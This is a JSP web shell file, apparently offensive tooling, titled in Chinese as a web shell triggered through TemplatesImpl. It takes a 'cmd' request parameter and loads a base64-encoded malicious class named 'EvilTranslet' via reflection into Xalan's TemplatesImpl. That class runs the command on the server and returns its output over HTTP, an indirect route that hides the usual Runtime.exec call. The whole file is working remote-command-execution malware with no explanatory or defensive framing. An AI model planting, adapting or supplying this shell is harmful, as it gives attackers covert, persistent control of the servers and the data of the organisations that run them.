<%@ page import="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl" %>
<%@ page import="com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl" %>
<%@ page import="java.io.File" %>
<%@ page import="java.io.FileInputStream" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.nio.file.Files" %>
<%@ page import="java.nio.file.Paths" %>
<%@ page import="java.util.Base64" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="sun.misc.IOUtils" %>
<%@ page import="sun.reflect.misc.FieldUtil" %>
<html>
<body>
<h2>利用TemplatesImpl触发的JSP WebShell</h2>
<%
    String tmp = System.getProperty("java.io.tmpdir");
    String inputFile = tmp + File.separator + "jabdhjabdjkandaldlanaklndkand.txt";
    String outputFile = tmp + File.separator + "jfkdjkadnkladmknjknfkjnadkad.txt";
    String s = request.getParameter("cmd");
    if (Files.exists(Paths.get(inputFile)))
        Files.delete(Paths.get(inputFile));
    Files.write(Paths.get(inputFile), s.getBytes());

    TemplatesImpl t = new TemplatesImpl();
    Field field = FieldUtil.getDeclaredFields(t.getClass())[4];
    byte[][] bytes = new byte[1][];
    bytes[0] = Base64.getDecoder().decode("yv66vgAAADQAjwoAJgA5CAA6CgA7ADwHAD0KAAQAOQoABAA+CQA/AEAIAEEKAAQAQggAQwoARABFBwBGCgBHAEgKAEkASgoADABLCABMCABNCgAMAE4IAE8KAAwAUAoARABRCgBSAFMHAFQHAFUKABgAVgoAFwBXCgAXAFgIAFkHAFoKAEkAWwoASQBcCgAMAF0HAF4KAEkAXwcAYAoAIwBhBwBiBwBjAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAGIHAEYHAGQHAD0HAFQHAGABAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApFeGNlcHRpb25zBwBlAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBABFFdmlsVHJhbnNsZXQuamF2YQwAJwAoAQAOamF2YS5pby50bXBkaXIHAGYMAGcAaAEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDABpAGoHAGsMAGwAbQEAA2NtZAwAbgBvAQAGcmVzdWx0BwBwDABxAHIBABBqYXZhL2xhbmcvU3RyaW5nBwBzDAB0AHUHAHYMAHcAeAwAJwB5AQABJQEAAAwAegB7AQABIAwAfAB9DAB+AH8HAIAMAIEAggEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyDAAnAIMMACcAhAwAhQBvAQABCgEAGGphdmEvbmlvL2ZpbGUvTGlua09wdGlvbgwAhgCHDACIAIkMAIoAiwEAGGphdmEvbmlvL2ZpbGUvT3Blbk9wdGlvbgwAjACNAQATamF2YS9sYW5nL1Rocm93YWJsZQwAjgAoAQAMRXZpbFRyYW5zbGV0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSW5wdXRTdHJlYW0BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEADGphdmEvaW8vRmlsZQEACXNlcGFyYXRvcgEAEkxqYXZhL2xhbmcvU3RyaW5nOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBABNqYXZhL25pby9maWxlL1BhdGhzAQADZ2V0AQA7KExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbmlvL2ZpbGUvUGF0aDsBABNqYXZhL25pby9maWxlL0ZpbGVzAQAMcmVhZEFsbEJ5dGVzAQAYKExqYXZhL25pby9maWxlL1BhdGg7KVtCAQAFKFtCKVYBAAdyZXBsYWNlAQBEKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylMamF2YS9sYW5nL1N0cmluZzsBAAVzcGxpdAEAJyhMamF2YS9sYW5nL1N0cmluZzspW0xqYXZhL2xhbmcvU3RyaW5nOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAGZXhpc3RzAQAyKExqYXZhL25pby9maWxlL1BhdGg7W0xqYXZhL25pby9maWxlL0xpbmtPcHRpb247KVoBAAZkZWxldGUBABcoTGphdmEvbmlvL2ZpbGUvUGF0aDspVgEACGdldEJ5dGVzAQAEKClbQgEABXdyaXRlAQBHKExqYXZhL25pby9maWxlL1BhdGg7W0JbTGphdmEvbmlvL2ZpbGUvT3Blbk9wdGlvbjspTGphdmEvbmlvL2ZpbGUvUGF0aDsBAA9wcmludFN0YWNrVHJhY2UAIQAlACYAAAAAAAMAAQAnACgAAQApAAABcAAFAAgAAADbKrcAARICuAADTLsABFm3AAUrtgAGsgAHtgAGEgi2AAa2AAlNuwAEWbcABSu2AAayAAe2AAYSCrYABrYACU64AAu7AAxZLAO9AAy4AA24AA63AA8SEBIRtgASEhO2ABS2ABW2ABY6BLsABFm3AAU6BbsAF1m7ABhZGQS3ABm3ABo6BhkGtgAbWToHxgATGQUZB7YABhIctgAGV6f/6C0DvQAMuAANA70AHbgAHpkADi0DvQAMuAANuAAfLQO9AAy4AA0ZBbYACbYAIAO9ACG4ACJXpwAITCu2ACSxAAEABADSANUAIwACACoAAABCABAAAAAPAAQAEQAKABIAJAATAD4AFQBnABYAcAAXAIIAGQCNABoAnQAcAK8AHQC6AB4A0gAhANUAHwDWACAA2gAiACsAAAAzAAX/AIIABwcALAcALQcALQcALQcALgcALwcAMAAA/AAaBwAtHP8AGgABBwAsAAEHADEEAAEAMgAzAAIAKQAAABkAAAADAAAAAbEAAAABACoAAAAGAAEAAAAnADQAAAAEAAEANQABADIANgACACkAAAAZAAAABAAAAAGxAAAAAQAqAAAABgABAAAALQA0AAAABAABADUAAQA3AAAAAgA4");
    field.setAccessible(true);
    field.set(t, bytes);

    Field field2 = FieldUtil.getDeclaredFields(t.getClass())[12];
    field2.setAccessible(true);
    field2.set(t, TransformerFactoryImpl.newInstance());

    Field field3 = FieldUtil.getDeclaredFields(t.getClass())[3];
    field3.setAccessible(true);
    field3.set(t, "evil");

    Field field4 = FieldUtil.getDeclaredFields(t.getClass())[7];
    field4.setAccessible(true);
    field4.set(t, new HashMap<>());

    try {
        t.getOutputProperties();
    } catch (Exception e) {}

    String resutl = new String(IOUtils.readFully(new FileInputStream(new File(outputFile)), -1, true));
    response.getOutputStream().write(resutl.getBytes());
%>
</body>
</html>